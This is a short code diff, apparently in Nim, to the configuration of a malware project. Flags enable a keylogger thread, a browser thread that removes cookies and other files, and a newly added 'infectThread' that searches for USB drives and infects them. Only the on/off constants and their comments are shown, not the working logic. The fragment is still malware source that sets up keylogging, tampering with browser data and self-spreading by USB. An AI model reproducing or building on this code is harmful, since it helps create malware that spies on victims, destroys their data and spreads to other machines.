@@ -10,14 +10,16 @@ const USE_KEYLOGGER_THREAD*: bool = true
 ## DEFAULT: true
 const USE_BROWSER_THREAD*: bool = true
 
-## when `true` the browser thread will remove cookies
+## when `true` browserThread will remove cookies
 ## and other files instead of renaming them
 ## use `false` only for testing purposes only so no data is lost
 ## DEFAULT: true
 const BROWSER_THREAD_REMOVE_FILE*: bool = false
 
-## TODO: IMPLEMENT THE FOLLOWING LINES
+## infectThread will search for usb drives and infect them
+const USE_INFECT_THREAD*: bool = true
 
+## TODO: IMPLEMENT THE FOLLOWING LINES
 
 type browserThreadStart = enum
   Always ## NOT RECOMMENDED
